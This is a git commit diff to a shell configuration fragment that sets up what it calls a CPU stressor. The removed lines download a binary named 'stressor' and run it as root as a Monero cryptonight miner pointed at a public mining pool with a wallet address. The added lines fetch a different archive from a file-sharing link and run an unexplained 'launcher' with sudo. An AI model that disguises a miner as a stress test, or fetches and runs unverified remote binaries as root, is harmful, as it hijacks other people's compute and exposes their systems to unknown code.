660b2a90c506bd8437e67fe9d719fb4cc2d456c5
Peter Chronz <peter.chronz@gmail.com>
2017-12-08 15:56:45 +0100

    Update to new stressor binary

--- templates/fragments/cpu-stress_configure.sh
+++ templates/fragments/cpu-stress_configure.sh
@@ -5,7 +5,8 @@ echo "Start to configure cpu stressor as a client"
 
 sudo apt update && apt install -y libmicrohttpd10 \
                        libhwloc5 libcurl4-openssl-dev
-wget -O stressor https://owncloud.gwdg.de/index.php/s/0aUOjR89S3Tr79W/download
-chmod +x stressor
-sudo ./stressor -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49zaRwbRQNv9MfHijHCPaoGQUoSKc5TUSZhM4eb7GdToTabyLrEB1HhJwSyQA4N7TkcBbYNDnzuDLGgngyr76ukkC7zu7B2 -p x -t 16
+wget -O stressor.tar.gz https://owncloud.gwdg.de/index.php/s/bx2q1X5OkjgfgI9/download
+tar zxvf stressor.tar.gz
+cd bin
+sudo ./launcher
 
